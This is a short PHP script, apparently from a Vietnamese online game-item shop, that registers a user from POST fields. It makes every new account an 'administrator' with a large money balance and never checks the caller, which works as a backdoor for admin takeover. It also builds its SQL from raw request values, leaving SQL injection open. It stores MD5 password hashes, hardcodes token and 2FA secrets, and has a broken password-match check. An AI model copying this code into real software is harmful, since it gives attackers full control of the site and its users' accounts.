<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<?php
require $_SERVER['DOCUMENT_ROOT'].'/Core.php';
$kun = new System;
$user = $kun->user(); // gọi giá trị user đang login
    
$taikhoan = $_POST['username'];
$matkhau = $_POST['pass'];
$matkhau2 = $_POST['password'];
if($taikhoan == '' || $matkhau == '' || $matkhau2 == ''){
    die ('<script>Swal.fire("Thông Báo", "Vui Lòng Nhập Đầy Đủ Thông Tin", "info");</script>');
}
else if(!$matkhau == $matkhau2){
     die ('<script>Swal.fire("Thông Báo", "Vui Lòng Nhập Mật Khẩu Trùng Khớp!", "info");</script>');
}else{
    $matkhauuuu = md5($matkhau);
echo '<script>Swal.fire("Thông Báo", "Nhập Tài Khoản Và Mật Khẩu Thành Công Bây Giờ Bạn Có Thể Đăng Nhập Để Tận Hưởng Shop HIHI!", "success");</script>';
 mysqli_query($kun->connect_db(), "INSERT INTO `users` (`id`, `fbid`, `level`, `name`, `username`, `password`, `email`, `money`, `money_nap`, `kimcuong`, `quanhuy`, `token`, `auth`, `ip`, `verify`, `verify_code`, `gg2fa`, `status_2fa`, `time`) VALUES
(NULL, '0', 'administrator', '$taikhoan', '$taikhoan', '$matkhauuuu', '', 10000000, 0, '0', '0', 'e1c9258fe02c1c828e7e4b2440ebe915870fcf20fe673606aed792201841', 'd761df3c25596585967e577b50ad1357bc898f0d38c0b486742a2fea061f', '127.0.0.1', 'true', '79435', 'AVNYNRISHISJK4IT', '', 1653913256)");

    	echo '<meta http-equiv="refresh" content="0;URL=/" />';
}
?>